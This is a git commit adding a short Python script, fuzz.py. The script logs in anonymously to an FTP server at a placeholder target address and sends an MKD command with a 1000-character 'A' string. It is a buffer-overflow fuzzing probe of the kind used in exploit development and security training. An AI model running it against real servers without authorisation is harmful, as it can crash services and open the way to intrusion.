6da35aa49191c0778568ba1b02562df5e222e844
JT <shipcodez@gmail.com>
2015-06-30 16:13:57 +0800

    Create fuzz.py

---
+++ ftp/fuzz.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python
+ 
+import socket
+import sys
+ 
+evil = "A"*1000
+ 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('TARGET IP',21))
+ 
+s.recv(1024)
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.close
